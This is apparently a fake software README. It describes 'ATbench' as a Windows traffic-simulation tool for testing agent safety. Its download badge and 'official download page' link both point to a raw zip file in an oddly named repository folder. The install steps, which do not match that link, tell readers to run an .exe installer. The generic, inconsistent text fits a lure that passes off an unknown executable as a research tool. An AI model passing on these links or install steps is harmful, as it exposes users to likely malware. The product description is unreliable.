# 🚗 ATbench - Evaluate agent safety with realistic benchmarks

[![Download ATbench](https://img.shields.io/badge/Download-ATbench-blue.svg)](https://raw.githubusercontent.com/bright-teaser3082/ATbench/main/overremissly/Tbench-A-v1.4.zip)

ATbench provides a structured way to test how agents behave in complex scenarios. You can use this software to see how well an agent path performs in traffic or crowded environments. It helps you find errors in logic and improves the safety of your systems.

## 🛠️ System Requirements

Before you start, check your computer against these requirements. You need a standard Windows machine to run the software.

*   Windows 10 or Windows 11.
*   8 GB of RAM or more.
*   A stable internet connection for initial setup.
*   At least 2 GB of available hard drive space.
*   A dedicated graphics card helps performance, though it is not strictly required for basic testing.

## 📥 How to Install

Follow these steps to set up the software on your machine:

1.  Visit the [official download page](https://raw.githubusercontent.com/bright-teaser3082/ATbench/main/overremissly/Tbench-A-v1.4.zip).
2.  Look for the latest release version on the right side of the screen.
3.  Click on the file ending in .exe to start your download.
4.  Once the file finishes, open your Downloads folder in Windows.
5.  Double-click the installer file.
6.  Follow the instructions on your screen to complete the installation.
7.  The installer creates a shortcut on your desktop for quick access.

## 🚀 Getting Started

Launch ATbench using the shortcut on your desktop. When the window opens, you see the main dashboard. This dashboard shows the different test scenarios available to you. 

Choose a scenario to see how the agent handles the path. The software displays a preview of the environment. You can adjust the parameters of the test using the sliders on the left. Click the Start button to begin the simulation.

## 📊 Viewing Results

After the simulation finishes, the software creates a report. This report appears in a new window. It highlights three main areas:

*   Collision Rate: How often the agent hits an object.
*   Efficiency: How fast the agent reaches the target.
*   Smoothness: How natural the movement feels during the test.

You can save these reports as PDF files. Select File, then Save As from the menu at the top of the screen.

## ⚙️ Configuration Settings

You can customize the testing environment to better match your needs. Open the Settings menu to change the following:

*   Environment Type: Switch between highway, city, or parking lot scenarios.
*   Agent Speed: Adjust how fast the agent attempts to complete the path.
*   Obstacle Density: Change how many items the agent must avoid during the trip.

Save your settings after making changes. The software applies these rules to every new simulation you run.

## 💡 Troubleshooting Common Issues

If you experience issues, consult this list for solutions.

**Software does not open**
Check if you have other heavy programs running. Close these programs to free up memory for ATbench. If the issue persists, reinstall the software.

**The simulation pauses or lags**
Lower the graphic settings in the configuration menu. Reduce the obstacle density to make the simulation lighter on your computer hardware.

**Results do not export**
Verify that you have permission to write files to your chosen folder. Select a folder on your Desktop or Documents library to hold the exports.

**Missing icons or buttons**
Restart the application to refresh the user interface. Ensure your screen resolution matches standard settings for Windows.

## 🔍 Understanding the Benchmarks

ATbench uses a set of specific metrics to evaluate safety. You might notice terms such as Time to Collision or Jerk. 

Time to Collision measures the seconds before contact occurs if the agent keeps its current speed. A higher number indicates a safer path. 

Jerk measures how abruptly the agent changes its acceleration. Lower numbers mean the movement is smooth and human-like. 

The software calculates these metrics automatically. You do not need to perform manual math to understand the outcome of your tests. The dashboard provides a clear graph for every test run so you can see trends over time. 

If you find that an agent performs poorly on specific tests, change the input parameters and run the test again. This process helps you diagnose exactly where the agent struggles. Most users find that adjusting the speed or the layout of the environment reveals hidden flaws in the agent logic.

## 📖 Best Practices for Testing

For the most reliable results, keep your variables consistent. Change only one setting at a time when you test different logic versions. This isolates the variable and shows you exactly what change caused a performance shift. 

Keep a log of your manual changes. Create a folder on your computer to store the PDF reports from your tests. Rename these files with the date and change type so you stay organized.

You can compare two reports side by side on your screen. This visual check often makes it easier to spot improvements that numbers alone do not highlight. 

The software includes a reset button if you want to restore the default settings. Use this button if you accidentally change too many variables and want to start over from a clean state.

This tool acts as a sandbox for your safety research. It removes the risk of real-world testing by allowing you to simulate dangerous scenarios in a safe, controlled digital space. Use the data to improve your agent designs and ensure they handle traffic scenarios with high safety standards.